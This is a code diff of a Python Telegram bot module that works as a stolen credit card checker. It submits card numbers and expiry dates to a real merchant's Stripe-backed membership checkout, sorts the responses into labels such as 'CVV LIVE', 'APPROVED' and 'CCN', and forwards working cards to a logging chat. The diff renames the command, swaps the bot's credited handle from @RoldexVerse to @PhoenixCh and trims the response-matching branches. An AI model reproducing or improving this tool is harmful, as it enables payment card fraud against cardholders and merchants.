@@ -22,7 +22,7 @@ headers = {
 
 
 
-@Client.on_message(filters.command(["ca"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
+@Client.on_message(filters.command(["uh"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
 async def ca(Client, message):
     try:
         started_time = time.time()
@@ -36,7 +36,7 @@ async def ca(Client, message):
 <b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
             msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
             await Client.send_chat_action(message.chat.id, "typing")
             find = maindb.find_one({"_id": message.from_user.id})
@@ -141,7 +141,7 @@ async def ca(Client, message):
 <b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
 <b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
@@ -153,7 +153,7 @@ async def ca(Client, message):
 <b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
 <b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 else:
@@ -166,7 +166,7 @@ async def ca(Client, message):
 <b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
                                     await msg.edit_text(text)
                                     data = f"level=8&levelstodel=&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&first_name={first_name}&last_name={last_name}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear=ano"
                                     res = curl.post("https://my.smashgo.co/account/membership-checkout/?level=8",headers=headers,data=data)
@@ -178,7 +178,7 @@ async def ca(Client, message):
 <b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
                                     await msg.edit_text(text)
                                     try:
                                         if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
@@ -186,7 +186,7 @@ async def ca(Client, message):
                                             response = "CVV LIVE"
                                             r_logo = "✅"
                                             r_text = 'ZIP INCORRECT'
-                                        elif '"cvc_check":"pass"' in res.text or '"cvc_check":"success"' in res.text or "Thank You." in res.text or '"status": "succeeded"' in res.text or "Thank You For Donation." in res.text or "Your payment has already been processed" in res.text or "Success " in res.text or '"type":"one-time"' in res.text or "/donations/thank_you?donation_number=" in res.text or '"status": "complete"' in res.text or '"status": "cahrged"' in res.text or '"status": "suceess"' in res.text or '"status": "thanks"' in res.text or '"status": "successufulty"' in res.text or '"status": "thaks for your donation."' in res.text or '"status": "save"' in res.text or '"status": "pass"' in res.text or '"status": "true"' in res.text or '"status": "valid"' in res.text or '"status": "null"' in res.text or '"status": "complete"' in res.text or '"status": "validated"' in res.text or '"status": "successufll"' in res.text or '"status": "succefulity"' in res.text or "Payment complete" in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "cahrged"' in res.text or '"cvc_check": "suceess"' in res.text or '"cvc_check": "thanks"' in res.text or '"cvc_check": "successufulty"' in res.text or '"cvc_check": "thaks for your donation."' in res.text or '"cvc_check": "save"' in res.text or '"cvc_check": "pass"' in res.text or '"cvc_check": "true"' in res.text or '"cvc_check": "valid"' in res.text or '"cvc_check": "null"' in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "validated"' in res.text or '"cvc_check": "successufll"' in res.text or '"cvc_check": "succefulity"' in res.text or "Payment complete" in res.text or "fraudulent, LIVE" in res.text or "cvv_charged" in res.text or "cvv_not_charged" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text : #or 'donation_number=' in res.text
+                                        elif  '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
                                             save_live(lista)
                                             await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                             response = "APPROVED"
@@ -198,18 +198,6 @@ async def ca(Client, message):
                                             response = "APPROVED"
                                             r_logo = "✅"
                                             r_text = "LOW BALANCE"
-                                        elif "pickup_card" in res.text or 'Pickup Card' in res.text or 'pickup card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "PICKUP CARD"
-                                        elif "stolen_card" in res.text or 'stolen Card' in res.text or 'stolen card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "STOLEN CARD"
-                                        elif "lost_card" in res.text or 'Lost Card' in res.text or 'lost card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "LOST CARD"
                                         elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                             save_ccn(lista)
                                             await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
@@ -258,7 +246,7 @@ async def ca(Client, message):
 <b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
 <b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKEN: {get_time_taken(started_time)}'s
-<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
+<b>○</b> BOT BY: <b>@PhoenixCh</b>"""
                                         await msg.edit_text(lasttext)
                                         antidb.set(message.from_user.id, int(time.time()))
     
